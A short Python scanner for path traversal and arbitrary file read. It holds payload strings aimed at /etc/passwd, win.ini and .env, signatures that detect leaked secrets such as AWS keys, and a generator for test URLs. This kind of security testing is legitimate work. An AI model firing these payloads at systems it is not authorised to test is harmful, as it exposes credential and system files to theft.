#!/usr/bin/env python3
"""
Path Traversal & Arbitrary File Read Scanner.
Probes endpoints handling file paths or downloads.
"""

from __future__ import annotations
import urllib.parse
from typing import List, Dict, Any, Tuple

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "../../.env"
]

SENSITIVE_SIGNATURES = [
    "root:x:0:0:",
    "[extensions]",
    "[fonts]",
    "DATABASE_URL=",
    "SECRET_KEY=",
    "AWS_SECRET_ACCESS_KEY="
]

def check_traversal_vulnerability(response_status: int, response_text: str) -> Tuple[bool, str]:
    """Evaluates response for sensitive file disclosure."""
    if response_status == 200:
        for sig in SENSITIVE_SIGNATURES:
            if sig in response_text:
                return True, f"Critical: Sensitive file contents leaked (matched '{sig}')."

    if response_status == 500:
        return True, "Endpoint crashed with 500 Internal Server Error under path traversal payload."

    return False, "Endpoint resisted path traversal payload."

def generate_traversal_tests(base_url: str, param_name: str) -> List[Dict[str, Any]]:
    """Generates traversal test cases for a file parameter."""
    return [
        {
            "param": param_name,
            "payload": payload,
            "url": f"{base_url}?{urllib.parse.urlencode({param_name: payload})}"
        }
        for payload in TRAVERSAL_PAYLOADS
    ]
